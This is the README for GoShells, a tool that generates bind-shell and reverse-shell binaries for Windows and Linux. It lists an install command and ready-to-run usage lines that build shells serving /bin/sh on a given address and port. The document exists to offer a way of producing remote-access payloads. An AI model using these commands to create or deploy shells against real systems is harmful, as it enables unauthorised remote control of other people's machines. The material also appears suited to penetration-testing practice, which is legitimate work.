# GoShells

Quick tool to create Windows/Linux Bind or reverse shells binaries

## Installation

```shell
go install github.com/shoriwe/GoShells
```

## Usage

### Create a bind based command execution

```shell
goshells shell.elf bind 127.0.0.1:80 /bin/sh
```

### Create a reverse based command execution

```shell
goshells shell.elf reverse 127.0.0.1:80 /bin/sh
```
